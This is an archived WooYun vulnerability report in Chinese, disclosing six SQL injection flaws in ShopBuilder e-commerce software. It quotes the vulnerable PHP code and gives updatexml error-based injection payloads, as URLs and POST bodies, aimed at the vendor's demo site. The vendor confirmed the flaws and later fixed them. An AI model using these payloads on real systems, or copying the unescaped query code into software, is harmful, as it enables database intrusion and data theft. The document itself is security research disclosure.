{"id": 31930, "wybug_id": "wooyun-2015-0112688", "wybug_title": "ShopBuilder网上商城六处sql注入打包(demo成功)", "wybug_corp": "shop-builder.cn", "wybug_author": "路人甲", "wybug_date": "2015-05-19 11:48", "wybug_open_date": "2015-08-17 15:52", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["源码审核"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-05-19：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-05-19：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-05-22：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2015-07-13：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-07-23：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-08-02：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-08-17：\t细节向公众公开  简要描述： 打包提交，不刷洞。 详细说明：  注入1看到\\module\\vote\\index.php\ninclude_once(\"includes/global.php\");include_once(\"includes/smarty_config.php\");//=========================================\tif($_GET['t']==\"sp\")\t{\t\t$sql=\"select * from \".SPE.\" where id='$_GET[cid]'\";\t\t$db->query($sql);\t\t$de=$db->fetchRow();\t\t$title=$de['name'];\t\t$tit=\"<a href='$config[weburl]/?m=special&s=spd&name=$de[file_name]'>$title</a>\";\t\t$votes=$_GET['id'];\t}\telse\t{\t\tif(!empty($_GET['id']))\t\t{\t\t\t$sql=\"SELECT ftitle,title,nid,vote FROM \".NEWSD.\" WHERE nid='$_GET[id]'\";\t\t\t$db->query($sql);\t\t\t$de=$db->fetchRow();\t\t\t$title=$de['title'];\t\t\tif(!empty($de['ftitle']))\t\t\t$title=$de['ftitle'];\t\t\t$tit=\"<a href='$config[weburl]/?m=news&s=newsd&id=$de[nid]'>$title</a>\";\t\t\t$votes=substr($de['vote'],0,-1);\t\t\t\t}\t\telseif(!empty($_GET['vid']))\t\t{\t\t\t$title=\"调查结果\";\t\t\t$tit=\"\";\t\t\t$votes=$_GET['vid'];\t\t}\t}\t$sql=\"select * from \".NEWSVOTE.\" where id in ($votes)\";\t\t$db->query($sql);\t$vote=$db->getRows();\n$votes无单引号包裹。可以直接注入。构造\nhttp://democn.shop-builder.cn/?m=vote&s=index&vid=1%20and%20%75%70%64%61%74%65%78%6D%6C%28%32%2C%63%6F%6E%63%61%74%28%30%78%37%65%2C%28%76%65%72%73%69%6F%6E%28%29%29%29%2C%30%29\n因为有个防护函数，所以要url编码。\n\n直接出数据。#########################################################################注入2看到module\\adv\\admin\\adv.php\nif($_GET['delid'])\t\t{\t\t\t$sql=\"delete from \".ADVSCON.\"  where id='$_GET[delid]'\";\t\t\t$db->query($sql);\t\t\tunset($_GET['delid']);\t\t\tunset($_GET['s']);\t\t\tunset($_GET['m']);\t\t\t$getstr=implode('&',convert($_GET));\t\t\tmsg(\"?m=adv&s=adv.php&$getstr\");\t\t}\t\tif($_POST['act']=='op')\t\t{\t\t\tif($_POST['chk'])\t\t\t{\t\t\t\t$id=implode(\",\",$_POST['chk']);\t\t\t\t$sql=\"delete from \".ADVSCON.\" where ID in ($id)\";\t\t\t\t$db->query($sql);\t\t\t\t\t\t\t\t$getstr=implode('&',convert($_GET));\t\t\t\tmsg(\"?m=adv&s=adv.php&$getstr\");\t\t\t}\t\t\t}\t\t\t$sql=\"select ID,`name` from \".ADVS.\" order by id \";\t\t$db->query($sql);\t\t$re=$db->getRows();\t\t$tpl->assign(\"re\",$re);\n$id无单引号保护直接进入sql中，造成注入。构造\nhttp://democn.shop-builder.cn//main.php?m=adv&s=admin/adv&operation=ads\n然后post数据\nact=op&chk[]=1) or updatexml(1,concat(0x5c,user()),1)%23\n\n\n注入3#########################################################################module\\adv\\admin\\audit.php\ninclude_once(\"../includes/page_utf_class.php\");//==========================================if(!empty($_POST[\"action\"])&&$_POST[\"action\"]==lang_show('delete')){\tif(isset($_POST[\"de\"]) && is_array($_POST[\"de\"]))\t{\t\t$id=implode(\",\",$_POST[\"de\"]);\t\tif($id)\t\t\t$db->query(\"update \".ADVSCON.\" set statu='-2' where id in ($id) and statu=-1\");\t}}\n也是一样可以注入，不演示了。注入4#########################################################################\\module\\announcement\\admin\\announcement.php\nelse\t{\t\t\t//删除公告\t\tif($_GET['delid'])\t\t{\t\t\t$db->query(\"delete from \".ANNOUNCEMENT.\" where id='$_GET[delid]'\");\t\t\tunset($_GET['delid']);\t\t\tunset($_GET['s']);\t\t\tunset($_GET['m']);\t\t\t$getstr=implode('&',convert($_GET));\t\t\tmsg(\"?m=announcement&s=announcement.php&$getstr\");\t\t}\t\tif($_POST['act']=='op')\t\t{\t\t\tif(is_array($_POST['chk']))\t\t\t{\t\t\t\t$id=implode(\",\",$_POST['chk']);\t\t\t\t$sql=\"delete from \".ANNOUNCEMENT.\" where id in ($id)\";\t\t\t\t$db->query($sql);\t\t\t\tforeach($_POST['chk'] as $list)\t\t\t\t{\t\t\t\t\t$db->query(\"update \".PRO.\" set promotion_id=0 where promotion_id='$list'\");\t\t\t\t\t}\t\t\t}\t\t\tif($_POST['displayorder'])\t\t\t{\t\t\t\tforeach($_POST['displayorder'] as $key=>$list)\t\t\t\t{\t\t\t\t\t$db->query(\"update \".ANNOUNCEMENT.\" set displayorder='$list' where id='$key'\");\t\t\t\t\t\t}\t\t\t}\t\t\tmsg(\"?m=announcement&s=announcement.php\");\t\t}\n同样id可以注入。构造url\nhttp://democn.shop-builder.cn//main.php?m=announcement&s=admin/announcement\npost数据\nact=op&chk[]=1) or updatexml(1,concat(0x5c,user()),1)%23\n注入5#########################################################################module\\brand\\admin\\brand_cat.php\nif($_POST['act']=='op')\t\t{\t\t\tif($_POST['submit']==$lang['btn_submit'])\t\t\t{\t\t\t\tif(is_array($_POST['chk']))\t\t\t\t{\t\t\t\t\t$id=implode(\",\",$_POST['chk']);\t\t\t\t\t$sql=\"delete from \".BRANDCAT.\" where id in ($id)\";\t\t\t\t\t$db->query($sql);\t\t\t\t\t$sql=\"delete from \".BRANDCAT.\" where parent_id in ($id)\";\t\t\t\t\t$db->query($sql);\t\t\t\t}\t\t\t\tif($_POST['displayorder'])\t\t\t\t{\t\t\t\t\tforeach($_POST['displayorder'] as $key=>$list)\t\t\t\t\t{\t\t\t\t\t\t$db->query(\"update \".BRANDCAT.\" set displayorder='$list' where id='$key'\");\t\t\t\t\t\t\t}\t\t\t\t}\t\t\t}\t\t\tmsg(\"?m=brand&s=brand_cat.php\");\t\t}\t\t}\n然后构造\nhttp://democn.shop-builder.cn//main.php?m=brand&s=admin/brand_cat\npost数据\nact=op&chk[]=1) or updatexml(1,concat(0x5c,user()),1)%23\n注入6#########################################################################module\\brand\\admin\\brand.php\nif($_GET['delid'])\t\t{\t\t\t$sql=\"delete from \".BRAND.\"  where id='$_GET[delid]'\";\t\t\t$db->query($sql);\t\t\tunset($_GET['delid']);\t\t\tunset($_GET['s']);\t\t\tunset($_GET['m']);\t\t\tmsg(\"?m=brand&s=brand.php$getstr\");\t\t}\t\tif($_POST['act']=='op')\t\t{\t\t\tif($_POST['submit']==$lang['btn_submit'])\t\t\t{\t\t\t\tif(is_array($_POST['chk']))\t\t\t\t{\t\t\t\t\t$id=implode(\",\",$_POST['chk']);\t\t\t\t\t$sql=\"delete from \".BRAND.\" where id in ($id)\";\t\t\t\t\t$db->query($sql);\t\t\t\t}\t\t\t\tif($_POST['displayorder'])\t\t\t\t{\t\t\t\t\tforeach($_POST['displayorder'] as $key=>$list)\t\t\t\t\t{\t\t\t\t\t\t$db->query(\"update \".BRAND.\" set displayorder='$list' where id='$key'\");\t\t\t\t\t\t\t}\t\t\t\t}\t\t\t}\n   漏洞证明：  \n\n\n\n   修复方案：  过滤。   版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：低 漏洞Rank：5  确认时间：2015-05-19 15:52 厂商回复： 非常感谢 最新状态： 2015-05-25：已修复  ", "replys": "漏洞评价：\n评论\n     2015-06-17 12:45 |    \t\t明月影 \t\t\t( 路人 |\t\t\t        Rank:12 漏洞数:8        | 学姿势，学思路。)\t\t \n  这个牛叉    \n  \n\n\n", "wybug_level_fromcorp": "低", "wybug_rank_fromcorp": 5, "Ranks": null}